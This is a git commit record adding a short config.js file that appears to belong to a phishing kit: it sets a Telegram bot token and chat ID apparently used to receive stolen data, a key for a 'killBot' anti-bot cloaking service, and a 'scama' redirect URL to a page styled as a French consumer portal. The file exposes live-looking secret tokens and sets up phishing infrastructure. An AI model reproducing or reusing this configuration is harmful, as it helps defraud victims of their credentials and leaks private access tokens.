47aa788b3a624ff71d0991b01b240e88f433d119
brew0day <massartcouvertures@gmail.com>
2025-02-11 23:18:02 +0100

    updadte

---
+++ config.js
@@ -0,0 +1,7 @@
+// config.js
+export const telegramToken = "6751681131:AAFPgK-YJAp-uQovA7psa2iEkdO6n33AhJ8";
+export const telegramChatId = "-1002410143967";
+export const killBotApiKey = "225e7b97-524c-45d6-800c-aa7e3831a1ab";
+export const killBotConfigName = "default";
+// URL de redirection pour un visiteur légitime
+export const scamaURL = "https://particulier-p.pages.dev?iduser=TlRRNU5RPT0=&kV=RGRr2";
